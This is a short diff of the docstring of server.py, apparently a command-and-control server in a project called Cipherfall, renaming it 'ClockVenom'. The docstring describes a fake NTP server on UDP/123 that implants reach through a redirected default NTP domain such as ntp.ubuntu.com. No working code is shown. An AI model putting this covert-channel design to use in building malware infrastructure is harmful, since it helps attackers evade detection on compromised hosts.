@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-server.py — Cipherfall NTP C2 Server (fallback channel)
+ClockVenom (server.py) — Cipherfall NTP C2 Server
 
 Binds UDP/123 to act as a fake NTP server. Agents reach it by resolving their
 distro's default NTP domain (e.g. ntp.ubuntu.com) which has been redirected to
